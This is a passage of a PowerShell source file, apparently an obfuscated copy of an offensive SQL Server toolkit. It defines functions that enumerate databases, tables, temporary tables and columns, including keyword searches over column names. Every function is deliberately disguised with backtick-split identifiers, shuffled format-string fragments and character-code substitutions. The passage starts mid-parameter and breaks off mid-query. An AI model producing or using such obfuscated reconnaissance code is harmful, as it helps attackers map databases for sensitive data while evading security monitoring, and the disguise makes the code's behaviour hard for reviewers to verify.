        hELPMessagE = {"{3}{10}{9}{12}{2}{15}{0}{5}{6}{11}{17}{16}{7}{14}{13}{4}{8}{1}" -f'n','with.','m','SQL ','icate',' a','ccoun',' ',' ','d','Server or ','t','o','ent','to auth','ai','rd',' passwo'})]
        [string]${PA`s`s`WoRD},

        [Parameter(maNdATORY = ${F`A`LSe},
        hElpmesSAGE = {"{0}{2}{4}{1}{3}"-f 'W','redentia','indows','ls.',' c'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${C`RedEN`TiAL} =   $0459m2::"emp`TY",

        [Parameter(maNdAToRY = ${F`ALSe},
                vAluEfromPiPeLiNebyPRoPertYNAME = ${tr`Ue},
        hELPMesSAGE = {"{0}{4}{1}{6}{5}{2}{3}" -f 'SQL S','r ins','to connectio','n to.','erve','e ','tanc'})]
        [string]${INSt`A`Nce},

        [Parameter(manDATORy = ${fA`LSE},
                vaLuEfRompIpeLInEByproperTyNaME = ${tr`Ue},
        HeLpmeSsage = {"{0}{1}{3}{2}" -f'Database ','n','e.','am'})]
        [string]${DATA`BA`seNAME},

        [Parameter(mANdAtOrY = ${FA`lSe},
                vaLueFRoMPIPEliNebYproPERtyNaME = ${tr`UE},
        heLPMESsaGE = {"{2}{0}{1}{3}"-f 'able ','n','T','ame.'})]
        [string]${Ta`Blen`AmE},

        [Parameter(maNdAToRY = ${FA`LSe},
        helPMesSAGE = {(("{7}{8}{4}{1}{3}{6}{5}{0}{2}"-f'ult ','lect tables f','databases.','r',' se','efa','om d','Donz','53t'))."REPL`A`CE"('z53',[STRInG][cHaR]39)})]
        [switch]${No`DEF`AUl`Ts},

        [Parameter(MANDatorY = ${fA`L`se},
        HElPMeSsaGe = {"{7}{4}{2}{3}{0}{11}{6}{8}{13}{1}{10}{9}{12}{5}"-f 'rors','he','verbos','e er','press ','d.',' Us','Sup','ed ','nction is wra','n fu','. ','ppe','w'})]
        [switch]${sU`pPrESs`V`eRB`O`se}
    )

    Begin
    {
        ${tblt`Abl`Es} = &("{0}{1}{2}"-f 'New-O','bj','ect') -TypeName ("{3}{2}{1}{5}{0}{4}" -f 'l','.Data.','em','Syst','e','DataTab')

        
        if(${TABl`Ena`mE})
        {
            ${t`AblefiLt`er} = (' '+'WH'+'ERE '+'t.Table'+'Na'+'me '+'lik'+'e '+"'%$TableName%'")
        }
        else
        {
            ${tAb`L`E`FilTeR} = ''
        }
    }

    Process
    {
        

        
        ${cO`M`puT`ErNAME} = &("{2}{4}{5}{6}{7}{1}{0}{3}" -f 'mInst','ro','G','ance','et-C','ompute','rName','F') -Instance ${ins`Ta`NCE}

        
        if(-not ${IN`s`TancE})
        {
            ${In`s`TaNcE} = ${E`Nv`:C`OMPUTeRn`AME}
        }

        
        ${TeS`TcoN`NeCt`iOn} = &("{3}{5}{0}{1}{4}{2}"-f'LConnect','io','est','Get','nT','-SQ') -Instance ${in`Sta`Nce} -Username ${use`RN`Ame} -Password ${pas`S`word} -Credential ${CRE`DE`NTiAL} -SuppressVerbose | &("{1}{2}{0}"-f'ject','Wh','ere-Ob') -FilterScript {
            ${_}."sTAt`US" -eq ("{0}{1}{2}" -f 'A','cce','ssible')
        }
        if(${T`ESTCOnnect`i`oN})
        {
            if( -not ${sUPP`RESsV`e`RbO`sE})
            {
                &("{2}{4}{3}{1}{0}"-f'rbose','e','Wr','e-V','it') -Message ("$Instance "+': '+'Conne'+'c'+'t'+'ion '+'Su'+'ccess'+'.')
                &("{1}{0}{2}" -f'e','Writ','-Verbose') -Message ("$Instance "+': '+'G'+'rabb'+'ing '+'t'+'abl'+'es '+'f'+'rom '+'d'+'ata'+'bases '+'b'+'elow:')
            }
        }
        else
        {
            if( -not ${s`UPP`REssVeRbOsE})
            {
                &("{2}{1}{0}" -f'bose','te-Ver','Wri') -Message ("$Instance "+': '+'C'+'on'+'necti'+'on '+'Failed'+'.')
            }
            return
        }

        
        if(${NODef`A`ULTs})
        {
            
            ${tB`LdAt`ABAsEs} = &("{1}{2}{0}"-f'tabase','Get-SQLD','a') -Instance ${in`STAN`Ce} -Username ${USE`RN`AmE} -Password ${PasSw`o`RD} -Credential ${cr`e`dEN`TIal} -DatabaseName ${D`AT`AbAS`enaME} -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            
            ${tbldAta`Ba`seS} = &("{1}{3}{0}{2}" -f 'LData','Get-','base','SQ') -Instance ${I`NSTAn`ce} -Username ${uSE`Rn`AmE} -Password ${P`AssWo`Rd} -Credential ${Cr`eDeNt`iAL} -DatabaseName ${DaTA`B`Ase`NAme} -HasAccess -SuppressVerbose
        }

        
        ${tblDat`A`Ba`SeS} |
        &("{2}{0}{3}{1}"-f 'rEac','bject','Fo','h-O') -Process {
            
            ${D`BNamE} = ${_}."D`ATab`A`sEnAMe"

            if( -not ${S`UpprEss`VErb`o`SE})
            {
                &("{0}{1}{2}"-f 'Write','-Verbos','e') -Message ("$Instance "+': '+'- '+"$DbName")
            }

            
            ${q`UErY} = (' '+' '+'USE'+' '+"$DbName;
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SELE'+'CT '+' '+"'$ComputerName' "+'as'+' '+'[Compute'+'rNa'+'me],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'[In'+'sta'+'n'+'ce],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t.'+'TABLE_CA'+'TAL'+'O'+'G '+'A'+'S '+'[D'+'at'+'ab'+'aseN'+'ame],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t.TAB'+'LE'+'_S'+'CHE'+'MA '+'A'+'S '+'['+'S'+'chemaN'+'ame'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t.TABL'+'E_NAME'+' '+'A'+'S '+'[Tabl'+'eN'+'ame'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'C'+'ASE
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHEN'+' '+'(S'+'ELEC'+'T '+'CASE'+' '+'WHEN'+' '+'LEN'+'('+'t.TA'+'BLE_NAM'+'E) '+'- '+('LEN(REPLAC'+'E'+'(t'+'.'+'T'+'ABLE_NA'+'ME,'+'{0}#{'+'0'+'},{0}{0}'+')) ') -f  [chaR]39+'> '+'1 '+'T'+'HEN '+'1 '+'EL'+'SE '+'0 '+'END'+') '+'= '+'1 '+'TH'+'EN '+(('TE0GlobalT'+'em'+'pTable'+'TE0
'+' ')-ReplaCE 'TE0',[CHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'W'+'HEN '+'t.TA'+'BLE_NAME'+' '+'LIK'+'E '+(('WQf'+'%[_'+']%'+'WQf ')-repLaCE  ([chAR]87+[chAR]81+[chAR]102),[chAR]39)+'AN'+'D '+'(SELE'+'CT'+' '+'C'+'ASE '+'W'+'HEN '+'LEN'+'(t.T'+'AB'+'LE_NAME)'+' '+'- '+(('LEN(REP'+'LA'+'CE'+'(t.TA'+'BL'+'E_NA'+'ME'+',fiS'+'#fiS,fi'+'SfiS'+')) ')  -CrEPLACE ([CHAR]102+[CHAR]105+[CHAR]83),[CHAR]39)+'= '+'1 '+'T'+'HEN '+'1 '+'EL'+'SE '+'0 '+'END'+') '+'= '+'1 '+'TH'+'EN '+('{0}Loca'+'lT'+'e'+'mpTabl'+'e{0}
'+' ') -F  [ChaR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHE'+'N '+'t.'+'TAB'+'LE_NAME'+' '+'N'+'OT '+'LIKE'+' '+(('DiU%['+'_]%D'+'iU ')-REplACe  ([cHAR]68+[cHAR]105+[cHAR]85),[cHAR]39)+'A'+'ND '+'(SEL'+'E'+'CT '+'CAS'+'E '+'WH'+'EN '+'LEN('+'t.T'+'A'+'BL'+'E_NA'+'ME) '+'- '+(('LEN(REPLACE(t.'+'TABLE'+'_NAM'+'E,'+'ntx#ntx'+','+'ntxnt'+'x)) ') -cREPlAcE 'ntx',[chAR]39)+'= '+'1 '+'TH'+'EN '+'1 '+'ELS'+'E '+'0 '+'END)'+' '+'= '+'1 '+'THEN'+' '+('rP'+'UTabl'+'eVaria'+'ble'+'r'+'PU
 ')."re`PlA`ce"('rPU',[StRing][CHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'LSE '+'t.TAB'+'LE_'+'TYP'+'E
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'ND '+'A'+'S '+'TableT'+'ype'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.is'+'_ms_'+'sh'+'ipped,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.i'+'s_pub'+'lish'+'ed,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.is'+'_sch'+'ema_pu'+'bl'+'ished,
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.crea'+'t'+'e_'+'date,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.modify_'+'da'+'te '+'A'+'S '+'mod'+'if'+'ie'+'d'+'_date
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'F'+'ROM '+"[$DbName].[INFORMATION_SCHEMA].[TABLES] "+'t'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'JOIN'+' '+'sy'+'s.tab'+'les '+'s'+'t '+'ON'+' '+'t.'+'TA'+'BL'+'E_NA'+'ME '+'= '+'st.'+'name '+'AND'+' '+'t.'+'TAB'+'LE_S'+'CHEM'+'A '+'= '+'O'+'BJE'+'CT_SCH'+'EMA_'+'N'+'A'+'ME(st.'+'object_i'+'d)'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'JO'+'IN '+'s'+'ys.obj'+'ect'+'s '+'s '+'ON'+' '+'st.objec'+'t_i'+'d '+'= '+'s.ob'+'j'+'ect_'+'id'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$TableFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'O'+'RD'+'ER '+'B'+'Y '+'t.T'+'AB'+'L'+'E'+'_CATAL'+'OG, '+'t.TAB'+'L'+'E_S'+'CHE'+'M'+'A, '+'t.TA'+'BLE'+'_NAME')

            
            ${tb`lrES`U`lTs} = &("{1}{3}{2}{0}"-f'ery','G','t-SQLQu','e') -Instance ${IN`sT`ANCE} -Query ${Q`UeRY} -Username ${U`s`eRNa`me} -Password ${P`As`SWORd} -Credential ${CreDE`N`TIAl} -SuppressVerbose

            
            ${tBlT`ABL`ES} = ${tbl`TA`BLes} + ${t`BLr`Es`ULTs}
        }
    }

    End
    {
        
        ${Tb`ltAb`lEs}
    }
}





Function  G`e`T-SQlta`BlEt`emp
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MANDAtORY = ${fa`l`SE},
                vaLuEFRoMpiPeLinEbYproPERtYName = ${t`RuE},
        HelpmEsSaGE = {"{2}{8}{0}{7}{4}{1}{6}{10}{3}{5}{9}"-f 'rver o','o auth','SQ','c','t t','a','ent','r domain accoun','L Se','te with.','i'})]
        [string]${U`s`ERNaMe},

        [Parameter(mAndATOrY = ${f`ALSe},
                ValuEFrOmPIPelinEbypRoPERTynamE = ${TR`UE},
        hELPMessAGe = {"{4}{17}{1}{2}{0}{14}{10}{12}{7}{6}{8}{11}{13}{15}{5}{3}{16}{9}"-f'or domai','Serve','r ','te w','SQ','ica',' to ','ssword','au','h.','t p','th','a','e','n accoun','nt','it','L '})]
        [string]${pAsS`w`O`Rd},

        [Parameter(maNdatORY = ${Fa`L`Se},
        HELPmeSSAGE = {"{4}{5}{3}{2}{0}{1}"-f'i','als.','ent','ndows cred','W','i'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${C`R`EDenti`AL} =   (ITem varIabLE:0459m2).VaLue::"EM`PTY",

        [Parameter(MAnDAtOry = ${f`AlSe},
                vaLUefRomPipelineBypropErtynaME = ${T`RUe},
        HElPMesSage = {"{1}{3}{7}{9}{10}{5}{0}{6}{8}{4}{2}"-f'anc','SQL S','.','e',' to','t','e to c','r','onnection','ver ','ins'})]
        [string]${I`Ns`T`AnCE},

        [Parameter(mAndAtOrY = ${f`Al`SE},
        hELpMeSSage = {"{7}{1}{0}{12}{6}{10}{4}{11}{8}{15}{14}{3}{13}{5}{9}{2}"-f'pres','p','rapped.','c','se errors',' i','ve','Su','Used ','s w','rbo','.  ','s ','tion','en fun','wh'})]
        [switch]${sU`pp`REsSverb`osE}
    )

    Begin
    {
        ${T`BL`TabLEs} = &("{2}{1}{0}" -f 't','jec','New-Ob') -TypeName ("{3}{0}{4}{5}{2}{1}" -f'ystem.Data.D','e','abl','S','at','aT')

        
        if(${t`ABlENA`ME})
        {
            ${taB`LEFiL`TEr} = (' '+'w'+'here '+'t'+'able_na'+'me'+' '+'l'+'ike '+"'%$TableName%'")
        }
        else
        {
            ${T`Abl`E`FIlTEr} = ''
        }
    }

    Process
    {
        

        
        ${C`oMp`UTE`Rname} = &("{5}{4}{1}{2}{6}{3}{0}" -f'stance','mpu','terN','mIn','-Co','Get','ameFro') -Instance ${INS`Ta`NcE}

        
        if(-not ${iNS`TA`NCE})
        {
            ${In`s`TaN`cE} = ${e`Nv:Comp`UteRN`Ame}
        }

        
        ${TESTcONNEC`Ti`on} = &("{0}{3}{2}{1}" -f'Get-SQLCo','tionTest','ec','nn') -Instance ${InsT`An`Ce} -Username ${U`s`e`RnAMe} -Password ${PaSSw`O`Rd} -Credential ${crEd`e`NTI`Al} -SuppressVerbose | &("{0}{2}{3}{1}"-f'W','ject','here-','Ob') -FilterScript {
            ${_}."sTA`Tus" -eq ("{2}{1}{0}" -f 'ible','ess','Acc')
        }
        if(${Te`St`c`ONNECTI`ON})
        {
            if( -not ${SUPPR`Ess`VeRbO`sE})
            {
                &("{2}{1}{3}{4}{0}" -f'bose','ri','W','t','e-Ver') -Message ("$Instance "+': '+'Con'+'nection'+' '+'S'+'uccess'+'.')
                &("{3}{2}{1}{0}"-f 'se','bo','rite-Ver','W') -Message ("$Instance "+': '+'G'+'ra'+'b'+'bing '+'tables'+' '+'from'+' '+'d'+'atabase'+'s '+'be'+'lo'+'w:')
            }
        }
        else
        {
            if( -not ${SUp`pressVe`R`BosE})
            {
                &("{3}{0}{1}{2}" -f'Ver','b','ose','Write-') -Message ("$Instance "+': '+'Con'+'n'+'ecti'+'on '+'Fail'+'ed'+'.')
            }
            return
        }

        
        ${Q`U`eRy} = ((("{6}{12}{2}{13}{25}{20}{17}{3}{16}{27}{24}{21}{22}{18}{10}{26}{5}{4}{11}{7}{14}{9}{0}{1}{8}{19}{23}{15}"-f'    FROM [tempdb].[sys].[objects] AS t1
            JOIN [tempdb].[sys].[columns] AS t2 ON t1.OBJECT_ID = t2.OBJECT_ID
            JOIN sys.types AS t3 ON t2.system_type_id ','= t3.system_type_id
            WHERE t1.na','e,
                {0}tempdb{0} as {0}Database_Name{0},
                SCHEMA_NAME(t1.schema_id) AS {0}Schema_Name{0},
                t1.name AS {0}Table_Name{0},
                CASE
                    WHE','             ',' AS Table_Type,
                t2.name AS {0}Column_Name{0},
                t3.name AS {0}Column_Type{0},
                t1.is_ms_shipped,
                t1.is_published,','%[_]%{0} AND (SELECT CASE WHEN LEN(t1.name) - LEN(REPLACE(t1.name,{0}#{0},{0}{0})) = 1 THEN 1 ELSE 0 END) = 1 THEN {0}TableVariable{0}
                    ELSE NULL
                END','SELECT SERVERPROPERTY({0}MachineName{0}) as Comput','               t1.is_schema_published,
                t1.create_date,
            ','me LIKE {0}#%{0};
','    ','t1.name NOT ','
 ','er_Name,
                @@SERVERNAME AS Instanc','N (SELECT CASE WHEN LEN(t1.name) - LEN(REPLACE(t1.name,{0}#{0},{0}{0})) > 1 THEN 1 ELSE 0 END) = 1 THEN {0','    t1.modify_date
    ','  ','     WHEN t1.nam','able{0}
  ',' ','    ','alTempT','LocalTempTable{0}
                   ',' WHEN','      ','} AND (SELECT CASE WHEN LEN(t1.name) - LEN(REPLACE(t1.name,{0}#{0},{0}{0})) = 1 THEN 1 ELSE 0 END) = 1 THEN {0}','}Glob','LIKE {0}','e LIKE {0}%[_]%{0'))  -f[cHAr]39)

        
        ${tbl`Re`sUlTS} = &("{2}{0}{1}{3}"-f 'SQLQ','uer','Get-','y') -Instance ${InsT`AN`cE} -Query ${Q`UeRy} -Username ${U`SE`RnAme} -Password ${Pas`sWo`RD} -Credential ${cRede`N`TiAl} -SuppressVerbose

        
        ${t`BLTAbL`ES} = ${T`BlTAbl`Es} + ${tbL`RE`suLts}        
    }

    End
    {
        
        ${T`B`LtaB`lES}
    }
}






Function  gE`T-Sqlc`O`Lumn
{
    
    [CmdletBinding()]
    Param(
        [Parameter(ManDAtOrY = ${f`AlsE},
                VAlueFroMpipELINEBYPrOpErTynaMe = ${t`RUe},
        HELPmeSsAgE = {"{5}{8}{12}{0}{10}{13}{6}{2}{4}{9}{3}{14}{7}{1}{11}"-f'r','icate wit','account ','a','t','SQL S',' ','ent','erve','o ',' domai','h.','r o','n','uth'})]
        [string]${u`Se`Rna`ME},

        [Parameter(mANdaTORy = ${fa`lSe},
                VALueFROMPipElinEbYPrOPerTyNaMe = ${tr`Ue},
        helpmESSAGe = {"{5}{0}{14}{6}{13}{7}{10}{9}{17}{4}{16}{15}{2}{3}{12}{1}{11}{8}"-f 'rve','e','o ','a','w','SQL Se','or domai','cc','.','unt ','o','nticate with','uth','n a','r ','rd t','o','pass'})]
        [string]${Pa`S`sworD},

        [Parameter(MAnDaTORY = ${f`ALse},
        HeLpMesSAge = {"{0}{3}{1}{4}{2}"-f 'Windo','de','.','ws cre','ntials'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cRE`DEn`T`ial} =   (childITEm  vaRiAbLE:0459m2 ).vALuE::"emp`Ty",

        [Parameter(MaNDaToRy = ${Fal`se},
                VaLUEFRomPipELiNEbYPROpErTyNAmE = ${tr`UE},
        helpMESSagE = {"{0}{2}{9}{5}{4}{1}{8}{6}{7}{3}" -f 'SQ','o','L S','.','ce t','n','nnection',' to',' co','erver insta'})]
        [string]${iNSTAN`cE},

        [Parameter(mANDaTORy = ${F`Al`se},
                vALUefROMpipEliNEBYPRopERtYnAME = ${tR`Ue},
        heLpMEssAge = {"{2}{0}{1}{3}" -f'tabas','e','Da',' name.'})]
        [string]${DataB`A`S`en`AMe},

        [Parameter(MANDatORy = ${faL`sE},
                valUEFrOmPIPelINeBYPrOpERtyNAME = ${Tr`Ue},
        hELPmesSagE = {"{1}{2}{0}" -f 'ame.','Table ','n'})]
        [string]${t`AblE`NamE},

        [Parameter(ManDAtOry = ${f`Alse},
                VAlUeFromPipeLinebyPrOpERTynaMe = ${T`RuE},
        heLpmEssAGE = {"{1}{2}{4}{6}{0}{5}{3}" -f 'm','Filt','e','.','r','n name',' by exact colu'})]
        [string]${CoLumnN`A`ME},

        [Parameter(mAnDAtory = ${F`AL`se},
                VALUEFRoMpIPElInebYpropeRTynAmE = ${TR`UE},
        hElPMessAge = {"{2}{8}{18}{10}{13}{11}{16}{15}{3}{6}{12}{14}{5}{0}{17}{4}{1}{7}{9}"-f 'rts ','perated l','Co','dcard',' se','o','s','ist','lumn','.','me us','g w',' in sea','in','rch.  Supp','l','i','comma',' na'})]
        [string]${cO`lUmNN`AMeS`ea`R`cH},

        [Parameter(mANdAtoRy = ${F`ALSE},
        HElPmESsaGE = {(("{4}{9}{8}{2}{5}{6}{3}{1}{7}{0}"-f'ses.',' da','rom ','t','Don{0}t ','def','aul','taba','ct tables f','sele'))  -f [cHar]39})]
        [switch]${NodEf`AU`LTS},

        [Parameter(MaNDaTorY = ${fA`L`Se},
        HeLpMesSaGe = {"{5}{6}{7}{3}{9}{4}{2}{1}{10}{0}{8}{11}"-f't','whe','d ','bose e','rs.  Use','Supp','re','ss ver','ion is wrapped','rro','n func','.'})]
        [switch]${S`U`ppREss`Ve`RbOsE}
    )

    Begin
    {
        
        ${Tb`LcOLum`NS} = &("{1}{0}{2}" -f 'Obje','New-','ct') -TypeName ("{2}{1}{4}{5}{0}{3}"-f'aT','Da','System.','able','t','a.Dat')

        
        if(${tA`BLEN`A`ME})
        {
            ${t`ABl`E`Na`MEFiLTeR} = (' '+'and'+' '+'t.'+'TABLE_'+'N'+'AME '+'li'+'ke '+"'%$TableName%'")
        }
        else
        {
            ${TAB`le`NA`MEFilt`Er} = ''
        }

        
        if(${cOLU`mN`NaME})
        {
            ${CO`LU`mNfI`lTEr} = (' '+'a'+'nd '+'c.'+'COLU'+'MN'+'_NAME'+' '+'like'+' '+"'$ColumnName'")
        }
        else
        {
            ${COlUM`N`FIlT`eR} = ''
        }

        
        if(${coLUM`NN`AmE`sea`RcH})
        {
            ${C`o`LUM`NS`EaRchfIlTER} = (' '+'and'+' '+'c.COL'+'U'+'MN_NAME'+' '+'lik'+'e '+"'%$ColumnNameSearch%'")
        }
        else
        {
            ${CoLuM`NSEArc`h`F`ilt`eR} = ''
        }

        
        if(${c`ol`UmNnAmeSea`Rch})
        {
            ${key`WO`RdS} = ${c`oL`U`MnnA`MeSe`ArCh}.("{1}{0}" -f't','spli').Invoke(',')

            [int]${I} = ${Key`W`ordS}."CO`UNT"
            while (${I} -gt 0)
            {
                ${I} = ${I} - 1
                ${k`eYWO`RD} = ${kEY`wORDS}[${I}]

                if(${i} -eq (${KE`y`woRDS}."C`OUNt" -1))
                {
                    ${c`O`lumN`SEAR`cHfiLTEr} = ('and'+' '+'c.COLUM'+'N_N'+'AME'+' '+'li'+'ke '+"'%$Keyword%'")
                }
                else
                {
                    ${CoLuMn`s`EaRChF`IlT`ER} = ${cOl`UM`NSEARC`hfILTER} + (' '+'or'+' '+'c.'+'COLUMN_NAM'+'E'+' '+'li'+'ke '+"'%$Keyword%'")
                }
            }
        }
    }

    Process
    {
        

        
        ${Co`Mp`U`Te`RNaME} = &("{5}{4}{1}{2}{3}{6}{0}" -f'ance','rName','From','I','mpute','Get-Co','nst') -Instance ${INs`TAN`CE}

        
        if(-not ${i`NST`A`NCe})
        {
            ${i`Ns`TAnCE} = ${Env`:computer`NA`mE}
        }

        
        ${TE`stcOn`N`E`CtION} = &("{1}{3}{2}{6}{0}{5}{4}"-f'nectionT','Get','L','-SQ','t','es','Con') -Instance ${i`Nsta`NCE} -Username ${u`seRNA`me} -Password ${p`Assw`O`RD} -Credential ${CrEde`N`TiAL} -SuppressVerbose | &("{0}{2}{1}{3}"-f'Where-Ob','ec','j','t') -FilterScript {
            ${_}."S`Tatus" -eq ("{2}{3}{0}{1}" -f'essib','le','Ac','c')
        }
        if(${TeSTcoN`NEc`TI`ON})
        {
            if( -not ${s`UPpreSSvERbo`se})
            {
                &("{0}{3}{2}{1}" -f 'Wr','e','rbos','ite-Ve') -Message ("$Instance "+': '+'Con'+'n'+'e'+'ction '+'S'+'ucce'+'ss.')
            }
        }
        else
        {
            if( -not ${sU`PpReSSVe`R`B`OSE})
            {
                &("{0}{1}{2}"-f 'Write','-Verbo','se') -Message ("$Instance "+': '+'Conne'+'ction'+' '+'Fai'+'le'+'d.')
            }
            return
        }

        
        if(${no`D`eFaUL`TS})
        {
            
            ${t`BL`dAtaB`A`sES} = &("{0}{1}{2}{3}" -f'Ge','t-SQLDatab','a','se') -Instance ${in`sTA`Nce} -Username ${USer`NA`ME} -Password ${pa`SS`word} -Credential ${CR`Ed`Ent`IAL} -DatabaseName ${DAtA`BAsE`N`AMe} -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            
            ${TBLD`At`AbASES} = &("{0}{1}{2}{3}" -f 'Get','-SQLDat','abas','e') -Instance ${I`NS`T`ANcE} -Username ${UseR`N`AmE} -Password ${p`AssWo`RD} -Credential ${cRED`enti`AL} -DatabaseName ${dA`TABASena`ME} -HasAccess -SuppressVerbose
        }

        
        ${t`BLD`AtabAsES} |
        &("{0}{3}{4}{1}{2}"-f'ForEa','je','ct','ch','-Ob') -Process {
            
            ${d`BNAME} = ${_}."daTA`Base`NA`Me"

            
            ${qu`E`Ry} = (' '+' '+'US'+'E '+"$DbName;
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'ELECT '+' '+"'$ComputerName' "+'as'+' '+'[Compu'+'te'+'rN'+'ame],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'[In'+'stan'+'ce],'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t.'+'TABLE_CAT'+'ALOG'+' '+'AS'+' '+'[Da'+'tabase'+'Name'+'],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t.TAB'+'LE_SCHEM'+'A '+'A'+'S '+'[Sc'+'h'+'emaName],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t'+'.TA'+'BLE_NAME '+'as'+' '+'[Ta'+'b'+'leNam'+'e]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'CA'+'SE'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WH'+'EN '+'(S'+'ELECT'+' '+'CA'+'SE '+'WH'+'EN '+'LEN(t.TABL'+'E_NA'+'ME'+') '+'- '+(('LEN(REPLACE('+'t.'+'T'+'A'+'BLE_'+'NAME,'+'{0}#{0'+'},{0}{0'+'})) ') -f [Char]39)+'> '+'1 '+'THE'+'N '+'1 '+'EL'+'SE '+'0 '+'END'+') '+'= '+'1 '+'THEN'+' '+('{0}GlobalT'+'emp'+'Tabl'+'e{0}'+'
 ')-F  [chaR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'W'+'HEN '+'t.'+'TA'+'BLE_'+'NAME '+'L'+'IKE '+(('iSg%['+'_]%iS'+'g ')  -RePlACE'iSg',[CHAR]39)+'AND'+' '+'(SELE'+'CT'+' '+'CASE'+' '+'WHE'+'N '+'LE'+'N'+'(t.TABLE_N'+'AM'+'E)'+' '+'- '+('LEN('+'RE'+'PLAC'+'E(t.TABLE_'+'NAM'+'E'+',ikI'+'#ikI,ikIi'+'kI'+'))'+' ')."r`ep`LAcE"(([char]105+[char]107+[char]73),[StRInG][char]39)+'= '+'1 '+'T'+'HEN '+'1 '+'ELSE'+' '+'0 '+'END'+') '+'= '+'1 '+'THEN'+' '+(('sU'+'Y'+'L'+'ocalTem'+'p'+'TablesUY
 ') -RePlace  ([cHar]115+[cHar]85+[cHar]89),[cHar]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHEN'+' '+'t.'+'TABLE_'+'NAM'+'E'+' '+'NOT'+' '+'L'+'IKE '+('3K6'+'%[_]'+'%3'+'K6 ')."Re`P`LaCE"(([cHAR]51+[cHAR]75+[cHAR]54),[strinG][cHAR]39)+'AN'+'D '+'(SE'+'LECT '+'CAS'+'E '+'WHEN'+' '+'LEN'+'('+'t.TABL'+'E_NAME) '+'- '+(('L'+'EN(REPLACE'+'('+'t.TABLE_NAME,nFz#nF'+'z,'+'nFznF'+'z)'+') ') -cREplACE  ([chAr]110+[chAr]70+[chAr]122),[chAr]39)+'= '+'1 '+'THEN'+' '+'1 '+'E'+'LSE '+'0 '+'END)'+' '+'= '+'1 '+'T'+'HEN '+('dz2Ta'+'bleV'+'ari'+'abledz2
 ')."rE`P`LACE"('dz2',[STRING][cHAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ELS'+'E '+'t.'+'TABLE_TYP'+'E
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'ND '+'AS'+' '+'['+'Ta'+'bleType'+']'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'c.COLU'+'MN_N'+'AM'+'E '+'as'+' '+'[Colum'+'nNa'+'me],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'c.DA'+'TA_TY'+'PE '+'a'+'s '+'['+'ColumnD'+'ataType'+'],
'+'	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'c.CH'+'ARAC'+'TER_MAX'+'IMU'+'M_LEN'+'GT'+'H '+'a'+'s '+'[Co'+'lu'+'mn'+'Max'+'Length],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'st.is_m'+'s_'+'ship'+'ped,
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'t.is_publi'+'shed'+',
